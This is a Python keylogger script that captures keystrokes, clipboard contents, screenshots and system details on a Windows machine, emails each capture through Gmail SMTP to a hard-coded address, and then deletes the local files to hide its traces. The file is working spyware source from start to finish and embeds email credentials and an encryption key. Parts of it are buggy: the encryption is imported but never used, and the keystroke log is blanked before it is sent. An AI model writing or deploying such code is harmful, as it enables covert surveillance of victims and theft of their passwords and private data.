# libraries
# for email services
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# for comp info
import socket
import platform

# for clipboard
import win32clipboard

# for keystrokes
from pynput.keyboard import Key, Listener

# for system info and time
import time

#   for screenshot
from PIL import ImageGrab

# to encrypt
from cryptography.fernet import Fernet

# keylogger
key_info = 'key_log.txt'
sys_info = 'systeminfo.txt'
clipboard_info = 'clipboard.txt'
screenshot_info = 'screenshot.png'

key_info_e = 'e_key_log.txt'
sys_info_e = 'e_systeminfo.txt'
clipboard_info_e = 'e_clipboard.txt'

filepath = 'D:\\KeyloggerProject'
extend = "\\"
filemerge = filepath + extend

# email function
email_address = 'dummymerno@gmail.com'
password = 'zdacycmpowueiuil'

to_addr = 'dummymerno@gmail.com'

key = '84IT4telKcGVlamZJOvxxW3U1cdEFYNN0XdHMNiUMyI='


def send_email(filename, attachment, to_addr):
    try:
        from_addr = email_address

        msg = MIMEMultipart()

        msg['From'] = from_addr

        msg['To'] = to_addr

        msg['Subject'] = "Log File"

        body = "Body_of_the_mail"

        msg.attach(MIMEText(body, 'plain'))

        filename = filename
        attachment = open(attachment, 'rb')

        p = MIMEBase('application', 'octet-stream')

        p.set_payload(attachment.read())

        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)

        s.starttls()

        s.login(from_addr, password)

        text = msg.as_string()

        s.sendmail(from_addr, to_addr, text)

        s.quit()
        print('successfully sent')

    except:
        print(" ")


# system_info
def computer_info():
    with open(filepath + extend + sys_info, 'a') as f:
        hostname = socket.gethostname()

        f.write('Processor: ' + platform.processor() + '\n')
        f.write('System: ' + platform.system() + '\t' + platform.version() + '\n')
        f.write('Machine: ' + platform.machine() + '\n')
        f.write('hostname: ' + hostname + '\n')


computer_info()
send_email(sys_info, filepath + extend + sys_info, to_addr)


#   clipboard info
def copy_clipboard():
    with open(filepath + extend + clipboard_info, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write('Clipboard data: \n' + clipboard_data)

        except:
            f.write('clipboard cannot be copied')


#   screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(filepath + extend + screenshot_info)

number_of_iterations = 0
number_of_iterations_end = 1

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        try:
            with open("D:\\KeyloggerProject\\key_log.txt", 'a') as f:
                for key in keys:
                    k = str(key).replace("'", " ")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()

        except:
            return


    def on_release(keys):
        if keys == Key.esc:
            return False


    # listener block listens for all keystrokes and executes the 3 funcs
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    with open(filepath + extend + key_info, 'w') as f:
        f.write(" ")

    #   sending keyboard info
    send_email(key_info, filepath + extend + key_info, to_addr)

    #   sending screenshot
    screenshot()
    send_email(screenshot_info, filemerge + screenshot_info, to_addr)

    #   sending clipboard items
    copy_clipboard()
    send_email(clipboard_info, filemerge + clipboard_info, to_addr)

    number_of_iterations += 1


# Clean up our tracks and delete files
delete_files = [sys_info, clipboard_info, key_info, screenshot_info]
for file in delete_files:
    os.remove(filemerge + file)
